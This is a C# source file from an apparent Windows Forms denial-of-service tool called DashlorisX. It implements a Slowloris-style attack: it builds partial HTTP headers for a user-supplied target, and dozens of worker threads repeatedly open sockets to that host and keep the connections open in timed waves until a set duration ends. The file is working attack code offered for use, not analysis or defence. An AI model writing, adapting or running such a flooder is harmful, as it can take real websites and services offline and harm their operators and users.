// Author: Dashie
// Version: 1.0
//
// <description>
//

using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

using DashlorisX.Properties;

namespace DashlorisX
{ 
    public class PowerPoint
    {
	readonly AttackLog LogLog = new AttackLog();
	readonly DashNet DashNet = new DashNet();

	private string GetHeader()
	{
	    try
	    {
		var version = Settings.HTTPvBox.Text;
		var method = Settings.MethodBox.Text;

		var host = DashlorisX.HostTextBox.Text;

		if (host.Contains("http://") || host.Contains("https://"))
		{
		    host = host.ToLower().Replace("http://", "").Replace("https://", "");
		}

		var useragent = Settings.UserAgentBox.Text;
		var cookie = Settings.CookieBox.Text;

		var bytes = DashlorisX.BytesTextBox.Text;

		string Optionals()
		{
		    if (method == "POST")
		    {
			return string.Format
			(
			    "Accept-Encoding: gzip, deflate\r\n" +
			    "Upgrade-Insecure-Requests: 1\r\n"
			);
		    }

		    return string.Empty;
		}

		return string.Format(
		    $"@1 / @2\r\n".Replace("@1", method).Replace("@2", version) +
		    $"Host: @\r\n".Replace("@", host) +
		    $"Content-Length: @\r\n".Replace("@", bytes) +
		    $"User-Agent: @\r\n".Replace("@", useragent) +
		    $"{Optionals()}\r\n" +
		    $"Cookie: @\r\n\r\n".Replace("@", cookie.Replace(" ", ""))
		);
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	readonly List<Thread> InnerDashBots = new List<Thread>();
	readonly List<Thread> DashBots = new List<Thread>();
	
	readonly List<Socket> Stockings = new List<Socket>();

	string host = string.Empty;
	string port = string.Empty;

	private void SendHeader(Socket stocking)
	{   
	    try
	    {
		stocking.Ttl = 255;
		
		var result = stocking.BeginConnect(host, DashNet.GetInteger(port), null, null);
		var success = result.AsyncWaitHandle.WaitOne(500, true);
		
		if (stocking.Connected)
		{
		    byte[] header = Encoding.ASCII.GetBytes(GetHeader());

		    stocking.Send(header);
		}
		
		Stockings.Add(stocking);
	    }

	    catch
	    {
		return;
	    }
	}

	System.Timers.Timer DashTimer = null;

	private void StartTimer()
	{
	    try
	    {
		var duration = DashNet.GetInteger(DashlorisX.DurationTextBox.Text) * 1000;

		DashTimer = new System.Timers.Timer(duration);

		DashTimer.Elapsed += (s, e) =>
		{
		    StopAttack();
		};

		DashTimer.AutoReset = false;
		DashTimer.Enabled = true;

		DashTimer.Start();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}
	
	void LogSend(string text) =>
	    LogLog.TextLog.AppendText($"{text}\r\n");

	private void StartLatestDashBot()
	{
	    if (DashBots.Count > 0)
	    {
		DashBots[DashBots.Count - 1].IsBackground = true;
		DashBots[DashBots.Count - 1].Start();

		DashBots.Clear();
	    }
	}

	private void StartInnerDashBots()
	{
	    foreach (Thread DashBot in InnerDashBots)
	    {
		if (DashBots.IndexOf(DashBot) != 0)
		{
		    DashBot.Start();
		}
	    }
	}

	private Socket GetSocket() =>
	    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

	private bool KeepAlive = false;

	public void StartAttack()
	{
	    try
	    {
		host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
		port = DashNet.GetPort(DashlorisX.PortTextBox.Text).ToString();

		LogSend("Starting workers ....");

		KeepAlive = true;

		DashBots.Add(new Thread(() =>
		{
		    for (int k = 0; k < 32; k += 1)//worker integration
		    {
			InnerDashBots.Add(new Thread(() =>
			{
			    while (KeepAlive)
			    {
				for (int request = 0; request < 64; request += 1)
				{
				    if (!KeepAlive)
				    {
					break;
				    }

				    for (int multiplier = 0; multiplier < 4; multiplier += 1)
				    {
					if (!KeepAlive)
					{
					    break;
					}

					SendHeader(GetSocket());
				    }

				    if (!KeepAlive)
				    {
					break;
				    }

				    Thread.Sleep(2000);//inner interval integration
				}

				if (!KeepAlive)
				{
				    break;
				}

				Thread.Sleep(8000);//interval integration
			    }
			}));

			Thread.Sleep(250);//worker portion startup delay
		    }

		    StartInnerDashBots();
		}));

		StartLatestDashBot();
		StartTimer();

		LogSend("Sending waves and waves of requests ....");

		LogLog.ShowDialog();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}

	private void StartSafeTimer()
	{
	    var SafeTimer = new System.Timers.Timer(5000)
	    {
		AutoReset = false,
	    };

	    SafeTimer.Start();

	    SafeTimer.Elapsed += (s, e) =>
	    {
		DashlorisX.Launch.Text = "Launch";
	    };
	}

	public void StopAttack()
	{//Asynchronously?
	    DashlorisX.Launch.Text = "Stopping ....";

	    LogSend($"Stop signal received, stopping {DashBots.Count} bots and disconnecting {Stockings.Count} connections ....");

	    try
	    {
		KeepAlive = false;

		foreach (Socket Stocking in Stockings)
		{
		    if (Stocking != null)
		    {
			if (Stocking.Connected)
			{
			    Stocking.Close();
			}

			Stocking.Dispose();
		    }
		}

		Stockings.Clear();

		foreach (Thread InnerDashBot in InnerDashBots)
		{
		    InnerDashBot.Abort();
		}

		InnerDashBots.Clear();

		if (DashTimer.Enabled)
		{
		    DashTimer.Stop();
		    DashTimer = null;
		}

		StartSafeTimer();
	    }

	    catch (Exception E)
	    {
		throw (ErrorHandler.GetException(E));
	    }
	}
    }
}
